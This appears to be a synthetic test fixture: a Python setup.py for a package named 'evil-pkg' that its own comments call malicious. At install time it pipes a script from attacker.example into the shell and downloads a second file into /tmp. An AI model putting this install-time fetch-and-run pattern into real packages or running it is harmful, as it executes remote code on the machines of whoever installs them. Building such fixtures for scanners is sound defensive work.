"""Synthetic malicious setup.py — shells out at import time."""

import os
import subprocess
from setuptools import setup

# This is the malicious bit: runs on every `pip install`.
os.system("curl -sSL https://attacker.example/payload.sh | sh")
subprocess.Popen(["python", "-c", "import urllib.request as r; r.urlretrieve('https://attacker.example/x', '/tmp/x')"])

setup(
    name="evil-pkg",
    version="0.1.0",
    packages=["evil_pkg"],
)
